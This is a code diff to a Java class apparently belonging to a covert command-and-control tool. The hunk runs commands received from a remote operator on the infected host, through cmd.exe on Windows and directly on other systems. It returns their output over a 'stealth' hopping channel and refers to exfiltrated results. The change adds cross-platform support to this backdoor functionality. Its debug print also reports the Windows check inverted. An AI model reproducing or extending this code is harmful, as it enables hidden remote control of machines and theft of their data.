@@ -40,9 +40,16 @@ public class CommandChannel implements Runnable{
 							sendAll(s,exfilResult);
 						}else{
 							try{
-								Process p = Runtime.getRuntime().exec("cmd.exe /c "+command);
-								String output = inputStream2String(p.getInputStream());
-								msus.sendHoppingStealthMessage(output.getBytes(), 500);
+								System.out.println("On Windows: "+!System.getProperty("os.name").contains("Windows"));
+								if(!System.getProperty("os.name").contains("Windows")){
+									Process p = Runtime.getRuntime().exec(command);
+									String output = inputStream2String(p.getInputStream());
+									msus.sendHoppingStealthMessage(output.getBytes(), 500);
+								}else{
+									Process p = Runtime.getRuntime().exec("cmd.exe /c "+command);
+									String output = inputStream2String(p.getInputStream());
+									msus.sendHoppingStealthMessage(output.getBytes(), 500);
+								}
 							}catch(Exception e){
 								e.printStackTrace();
 								sendAll(s,e.toString());
